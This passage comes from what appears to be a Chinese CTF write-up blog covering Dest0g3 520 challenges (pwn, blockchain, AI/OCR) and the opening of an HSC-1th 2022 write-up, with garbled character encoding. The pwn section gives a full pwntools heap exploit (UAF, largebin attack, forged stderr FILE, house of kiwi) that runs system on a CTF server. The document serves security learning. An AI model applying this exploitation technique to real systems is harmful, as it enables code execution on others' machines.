class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;qword_4060 + v0) )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;qword_4060 + v0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·æ˜¯é«˜ç‰ˆæœ¬ï¼ˆ2.33ï¼‰çš„UAFï¼Œæœ€å°ç”³è¯·0x417å¤§å°çš„chunkï¼›</p><p>å…ˆç”¨è´Ÿidxä¿®æ”¹stderræŒ‡é’ˆï¼Œå†åˆ©ç”¨LargeBin Attackä¿®æ”¹__pointer_chk_guardï¼Œä¼ªé€ stderrä¿®æ”¹vtableï¼Œæœ€åæ”¹topchunkè§¦å‘house of kiwiã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.33.so&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, key</span>):</span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = (u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">16</span>) - libc.sym.__malloc_hook - <span class="number">0x71</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x470</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">heap_base = heap_addr - <span class="number">0x290</span></span><br><span class="line">global_max_fast = libc_base + <span class="number">0x1e3e78</span></span><br><span class="line">stderr_chain = libc_base + <span class="number">0x1e1648</span></span><br><span class="line">__pointer_chk_guard = libc_base + <span class="number">0x1ed5b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__pointer_chk_guard))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x1e1000</span>)*<span class="number">2</span> + p64(heap_addr) + p64(__pointer_chk_guard-<span class="number">0x20</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x480</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x40</span>) </span><br><span class="line"></span><br><span class="line">target = libc_base + libc.sym.system</span><br><span class="line">io_cookie_jumps = libc_base + <span class="number">0x1e1a20</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0x00000000fbad2087</span>)+<span class="number">3</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_IO_FILE += p64(libc_base + <span class="number">0x1e3660</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(io_cookie_jumps + <span class="number">0x40</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base + <span class="number">0x300</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(target ^ (heap_base+<span class="number">0xb30</span>),<span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">add(-<span class="number">4</span>,<span class="number">0x500</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x700</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x508</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xff0</span>,<span class="string">&#x27;8&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="BLOCKCHAIN"><a href="#BLOCKCHAIN" class="headerlink" title="BLOCKCHAIN"></a>BLOCKCHAIN</h2><h3 id="Where-the-flagï¼Ÿ"><a href="#Where-the-flagï¼Ÿ" class="headerlink" title="Where the flagï¼Ÿ"></a>Where the flagï¼Ÿ</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract find&#123;</span><br><span class="line">    uint96 private a=7855;</span><br><span class="line">    address private owner=msg.sender;</span><br><span class="line">    bool private f=false;</span><br><span class="line">    bool private t=true;</span><br><span class="line">    string[] private flag=[flag1,flag2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//https://ropsten.etherscan.io/address/0x78f2b5695e5e6e51fc0fd6d7e0caaa05190af9cc</span><br></pre></td></tr></table></figure></blockquote><p>åº”è¯¥æ˜¯éé¢„æœŸï¼Œè®¿é—®urlè¿›å…¥åˆçº¦ï¼Œåœ¨äº¤æ˜“0x2a00af3b2a2a939c491359e7960cbcbda6bdb4d45294fbb8d857100cbfb700e1çš„InputDataé‡Œï¼Œå¯ä»¥æŸ¥çœ‹åˆ°Hexæ•°æ®ï¼Œè½¬å­—ç¬¦ä¸²å¯å¾—åˆ°flagä¸¤æˆªå­—ç¬¦ä¸²ï¼š<code>Dest0g3&#123;0n1y_u5e_priv4t3_i</code>ï¼Œ<code>5_n0t_s4f3_1n_B1okCh4in!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Easy-predict"><a href="#Easy-predict" class="headerlink" title="Easy predict"></a>Easy predict</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">contract storageplace&#123;</span><br><span class="line">     mapping(uint=&gt;string)private _flag;</span><br><span class="line">     address owner;</span><br><span class="line">     constructor()public&#123;     </span><br><span class="line">     owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function flag() public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">    function buy(uint number) public returns(bytes1)&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract question&#123;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;bool)public regeister;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;uint)private seed;</span><br><span class="line">    </span><br><span class="line">    uint constant Price_Per_Char=10 ether;</span><br><span class="line">    </span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    storageplace immutable Flag;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">        </span><br><span class="line">        storageplace _Flag = new storageplace();</span><br><span class="line">        </span><br><span class="line">        Flag = _Flag;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier isowner()&#123;</span><br><span class="line">        require(msg.sender==owner,&quot;I think you are not the rignt person&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function addRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function removeRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function regeist() public &#123;</span><br><span class="line">        require(regeister[msg.sender]==false);</span><br><span class="line">        regeister[msg.sender]=true;</span><br><span class="line">        seed[msg.sender]=block.number+1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buyflag(uint want) public payable returns(bytes1)&#123;</span><br><span class="line">        require(msg.value==Price_Per_Char,&quot;is not free&quot;);</span><br><span class="line">        return Flag.buy(want);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function query(bytes32 answer) public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(regeister[msg.sender]);</span><br><span class="line">        require(block.number &gt;seed[msg.sender],&quot;too early&quot;);</span><br><span class="line">        bytes32 result = blockhash(seed[msg.sender]);</span><br><span class="line">        require(answer==result,&quot;wrong answer&quot;);</span><br><span class="line">        return Flag.flag();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public payable&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https://ropsten.etherscan.io/tx/0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925</span><br></pre></td></tr></table></figure></blockquote><p>ä¹Ÿæ˜¯éé¢„æœŸï¼Œè®¿é—®urlè¿›å…¥äº¤æ˜“0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925ï¼Œåœ¨InputDataé‡Œï¼Œå¯ä»¥æŸ¥çœ‹åˆ°Hexæ•°æ®ï¼Œè½¬å­—ç¬¦ä¸²å¯å¾—åˆ°flagäº”æˆªå­—ç¬¦ä¸²ï¼š<code>Dest0g3&#123;t</code>ï¼Œ<code>_sup3r_e3</code>ï¼Œ<code>hi5_1s_4</code>ï¼Œ<code>ea5y_p</code>ï¼Œ<code>_r1ght?&#125;</code>ï¼ŒæŒ‰è‹±æ–‡å­—é¢æ„æ€æ‹¼æ¥ï¼Œå¾—ï¼š<code>Dest0g3&#123;thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="OCR"><a href="#OCR" class="headerlink" title="OCR"></a>OCR</h3><blockquote><p>OCR is very useful in ctfï¼</p></blockquote><p>æ›´åƒMiscçš„AIé¢˜ï¼Œpngå›¾ç‰‡æ‰­æ›²ï¼Œåº”è¯¥å®½åº¦ä¸å¯¹ï¼ŒCRCå€¼çˆ†ç ´å®½é«˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">&#x27;flag_pic.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(binascii.b2a_hex(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>]))[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">n = <span class="number">4095</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(<span class="string">&#x27;flag2.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ­£å¸¸å›¾ç‰‡ï¼š</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/flag2.png" alt="flag2" style="zoom:50%;"></p><p>æ‰¾ä¸ªåœ¨çº¿OCRè¯†åˆ«å›¾é‡Œå­—ç¬¦ï¼Œå¾—åˆ°çš„ç»“æœæœ‰éƒ¨åˆ†å­—ç¬¦ä¸æ­£ç¡®ï¼Œæ‰‹åŠ¨ä¿®æ­£ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022</span><br><span class="line">194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40</span><br><span class="line">C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2</span><br><span class="line">E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D03579</span><br><span class="line">95A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FF</span><br><span class="line">E31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAA</span><br><span class="line">E92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF</span><br><span class="line">66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EF</span><br><span class="line">DE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07</span><br><span class="line">097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C55</span><br><span class="line">95E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD</span><br><span class="line">32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F060</span><br><span class="line">0FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A03</span><br><span class="line">95DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E81</span><br><span class="line">56c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE9</span><br><span class="line">48A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B0100012121</span><br><span class="line">01000C84D100080A0196EAFE6000000501190A000000000000000000001119004400650073007400</span><br><span class="line">3000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000</span><br><span class="line">000000</span><br></pre></td></tr></table></figure><p>ä»¥Hexä¿å­˜ä¸º7zå‹ç¼©åŒ…æ–‡ä»¶ï¼Œè§£å‹å¾—åˆ° <code>RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9</code>ï¼Œbase64è§£ç å³flagï¼š<code>Dest0g3&#123;34512098-3309-7712-8865-783460221647&#125;</code>ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;é¦–å±ŠDest0g3 520è¿æ–°èµ›æ›´åŠ æ³¨é‡CTFerçš„åŸºç¡€çŸ¥è¯†é¢æŒæ¡ç¨‹åº¦ï¼Œç”±æ˜“åˆ°éš¾ï¼Œé€‚åˆå„å­¦ä¹ é˜¶æ®µé€‰æ‰‹å‚åŠ ï¼Œçº¯èŒæ–°æ°´å‡†ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”èµ›æ—¶é—´ï¼š2022.5.20 10:00 - 5.27 10:00&lt;/p&gt;
&lt;p&gt;é¢˜ç›®åˆ†ç±»ï¼šWebã€Pwnã€Mis</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSC-1th 2022</title>
    <link href="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/"/>
    <id>https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/</id>
    <published>2022-02-20T08:28:40.000Z</published>
    <updated>2022-02-21T11:24:05.717Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>æœ¬å±ŠHSC1th 2022æ˜¯ç”±ç¤¾ä¼šæˆ˜é˜Ÿçº¢å®¢çªå‡»é˜Ÿï¼ˆHonker Security Commandoï¼‰ä¸¾åŠã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–webï¼Œcryptoï¼Œmiscï¼Œreç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚æ¯”èµ›ä¸‰ç”²å¯è·çªå‡»é˜Ÿå‘¨è¾¹ç¤¼å“ã€‚</p><p>Rank: 2</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign-in"></a>Sign-in</h3><blockquote><p>å‰å¾€çº¢å®¢çªå‡»é˜Ÿå…¬ä¼—å·å‘é€â€œHSC2019â€å¹¶ç­¾åˆ°å§ï¼</p></blockquote><p>å…¬ä¼—å·ç­¾åˆ°ã€‚</p><p>flag{HSC_W3LC0M3}</p><p>â€‹    </p><h3 id="DORAEMON"><a href="#DORAEMON" class="headerlink" title="DORAEMON"></a>DORAEMON</h3><p>zipå‹ç¼©åŒ…æ³¨é‡Š <code>å“†å•¦Aæ¢¦æŠŠæ³¡å¥½çš„QRæ”¾è¿›å£è¢‹åï¼Œç”¨å…­ä½æ•°å­—æŠŠè‡ªå·±æ”¾å¥½äº†ã€‚ä½ èƒ½æ‰¾åˆ°å®ƒå—ï¼Ÿ</code>ï¼Œçˆ†ç ´å¾—åˆ°å¯†ç  <code>376852</code>ï¼›</p><p>å¾—åˆ°pngå›¾ç‰‡ç”¨16è¿›åˆ¶ä¿®æ”¹å™¨ä¿®æ”¹é«˜åº¦ï¼Œå¾—åˆ°ç¼ºå°‘ä¸¤ä¸ªå®šä½å›¾æ¡ˆçš„äºŒç»´ç ï¼›</p><p>ä¿®å¤ä¸Šæ–¹ä¸¤ä¸ªå®šä½å›¾æ¡ˆï¼Œæ‰«æå¾—flagï¼šflag{sing1emak3r10v3m!sc}</p><p>â€‹    </p><h3 id="æ±é—»-äººè¨€å¦"><a href="#æ±é—»-äººè¨€å¦" class="headerlink" title="æ±é—»,äººè¨€å¦"></a>æ±é—»,äººè¨€å¦</h3><p>pngæ–‡ä»¶åå­˜åœ¨zipå‹ç¼©åŒ…ï¼Œæå–ååœ¨16è¿›åˆ¶æŸ¥çœ‹å™¨ä¸‹ä¿®å¤å‹ç¼©åŒ…ï¼Œå°†ä¸¤å¤„ <code>4B 50</code> ä¿®æ”¹ä¸º <code>50 